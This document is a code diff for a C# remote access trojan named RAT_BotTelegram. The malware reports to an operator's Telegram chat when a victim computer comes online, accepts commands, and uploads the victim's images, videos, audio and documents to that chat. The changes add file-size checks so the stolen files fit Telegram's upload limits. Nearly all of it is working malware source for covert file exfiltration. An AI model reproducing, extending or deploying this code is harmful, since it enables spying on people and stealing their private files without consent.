@@ -43,6 +43,7 @@ namespace RAT_BotTelegram {
 
             Bot.SendTextMessageAsync(config.id, " ==>>    Computer: " + Features.getUserName() + " is online    <<== ");
 
+            //Bot.SendVideoAsync(config.id, File.Open(@"F:\New folder (2)\40.3gp",FileMode.Open),999,999,999,"info",ParseMode.Default,false,false);
 
             // Escucha servidor
             Bot.StartReceiving();
@@ -57,18 +58,6 @@ namespace RAT_BotTelegram {
             if (message == null || message.Type != MessageType.Text) return;
 
             switch (message.Text.Split(' ').First()) {
-                //Enviar un inline keyboard con callback
-
-                //  /GetDir_Document <Obtiene toda la lista>
-                //  /GetDir_Music    <Está en desarrollo>
-                //  /GetDir_Download <Está en desarrollo>
-                //  /GetDir_Videos   <Está en desarrollo>
-                //  /GetDir_Pictures <Está en desarrollo>
-                //  /Get_Desktop  <Está en desarrollo>
-                //  /Get_Key      <Está en desarrollo>
-
-
-
 
                 case "/Status": // Verifica Si la PC se encuentra en linea
                     await Bot.SendTextMessageAsync(config.id, "==>>    Computer: " + Features.getUserName() + " is online    <<== ");
@@ -97,8 +86,6 @@ namespace RAT_BotTelegram {
                             text:"Get Download",
                             callbackData: "getDownload")
                     }});
-
-                    //var GetFiles = new InlineKeyboardMarkup
 
                     //await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
                     await Bot.SendTextMessageAsync(config.id, "Get files from?", replyMarkup: GetFiles);
@@ -158,7 +145,7 @@ namespace RAT_BotTelegram {
 
                 // Convierte la extensión en minuscula.
                 dir = dir.ToLower();
-                String[] video  = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv" };
+                String[] video  = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv","3gp" };
                 String[] audio  = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
                 String[] doc    = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf" };
                 String[] imagen = {"jpg", "jpeg", "png", "bmp","ico", "jpe", "jpe" };
@@ -212,59 +199,128 @@ namespace RAT_BotTelegram {
             }
 
             async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
-
                 await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
+                string infoFile(string file) {
+                    FileInfo fil = new FileInfo(file);
+                    var f= fil.Length;
+                   
+
+                    return "";
+                }
+                bool infoFileZize(string file) {  // Verifica si el archivo no supera los 50MB
+                    FileInfo fil = new FileInfo(file);
+                    var zise = fil.Length;
+                    // Convierte var en int 
+                    int MB = int.Parse(zise.ToString());
+                    // Ejemplo : 44.6MB = 46792411
+                    // Ejemplo : 95.3KB = 497687
+                    if (MB >= 49999999) {
+                        return false;   // Supera los 50MB
+                    } else {
+                        return true;    // No supera los 50Mb
+                    }
+                }
+                bool infoFileZizePhoto(string file) {  // Verifica si el archivo no supera los 50MB
+                    FileInfo fil = new FileInfo(file);
+                    var zise = fil.Length;
+                    // Convierte var en int 
+                    int MB = int.Parse(zise.ToString());
+                    // Ejemplo : 44.6MB = 46792411
+                    // Ejemplo : 95.3KB = 497687
+                    if (MB >= 9999999) {
+                        return false;   // Supera los 50MB
+                    } else {
+                        return true;    // No supera los 10Mb
+                    }
+                }
                 foreach (var file in Tools.GetFile(Path)) {
 
-                    switch (GetFileType(file)) {
-                        case "[Imagen]":
-                            try {
-                               await Bot.SendPhotoAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                            } catch {
-                                await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
-                            }
-                            break;
-                        case "[Video]":
-                            try {
-                                await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
-                            } catch (Exception e) {
-                                await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file) + "\n\n, quizas se deba a que el archivo de video es mayora 10mb. [Se tratará de buscar una sólución en las proximas actualizaciones]");
-                                Console.WriteLine("Hubo un error: \n" + e);
-                            }
-                            break;
-                        case "[Audio]":
-                            try {
-                                await Bot.SendAudioAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                            } catch (Exception) {
-                                await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
-                            }
-                            break;
-                        case "[Doc]":
-                            try {
-                                await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                            } catch (Exception) {
-                                await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
-                            }
-                            break;
-                        default:
-                            await Bot.SendTextMessageAsync(config.id, "Se ignoró el archivo " + GetFileName(file));
-                            break;
+                    if (infoFileZize(file)) {
+
+                        switch (GetFileType(file)) {
+                            case "[Imagen]":
+
+                                if (infoFileZizePhoto(file)) {
+                                    try {
+                                        await Bot.SendPhotoAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                    } catch {
+                                        // Enviar como documento.
+                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir la foto, " + GetFileName(file));
+                                    }
+                                } else {
+                                    try {
+                                        await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                    } catch {
+                                        // Enviar como documento.
+                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                    }
+                                }
+                                break;
+                            case "[Video]":
+                                try {
+
+                                    //await Bot.SendVideoAsync(config.id, File.Open(@"F:\New folder (2)\40.3gp", FileMode.Open));//, 120, 2, 2, "info", ParseMode.Default, true, false);
+
+                                    await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
+                                } catch (Exception e) {
+                                    // Enviará el video pero por partes 10 Segundos x 10 segundos 
+                                    try {
+
+                                        await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
+
+
+                                    } catch {
+                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file) + "\n\n, quizas se deba a que el archivo de video es mayora 50MB. [Se tratará de buscar una sólución en las proximas actualizaciones]");
+                                        Console.WriteLine("Hubo un error: \n" + e);
+                                    }
+
+                                    Console.WriteLine("Hubo un error: Principal\n" + e);
+                                }
+                                break;
+                            case "[Audio]":
+                                try {
+                                    await Bot.SendAudioAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                } catch (Exception) {
+                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                }
+                                break;
+                            case "[Doc]":
+                                try {
+                                    await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                } catch (Exception) {
+                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                }
+                                break;
+                            case "[P]": // El archivo se omitio por que pesa más de 50MB
+                                try {
+                                    await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                } catch (Exception) {
+                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                }
+                                break;
+                            default:
+                                await Bot.SendTextMessageAsync(config.id, "Se ignoró el archivo " + GetFileName(file));
+                                break;
+                        }
+                    } else {
+                        await Bot.SendTextMessageAsync(config.id, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
                     }
+                    
+
+                    
 
                     await Bot.SendTextMessageAsync(config.id, file);
                 }
                 await Bot.SendTextMessageAsync(config.id, "******************** Finish ********************* ");
             }
 
-
             var callbackQuery = callbackQueryEventArgs.CallbackQuery;
 
             switch (callbackQuery.Data) {
 
-
                 case "GetDocument":
+
                     GetFilesTelegram(@"F:\New folder (2)");
-                    
                     break;
 
                 case "GetDocumenttgert":
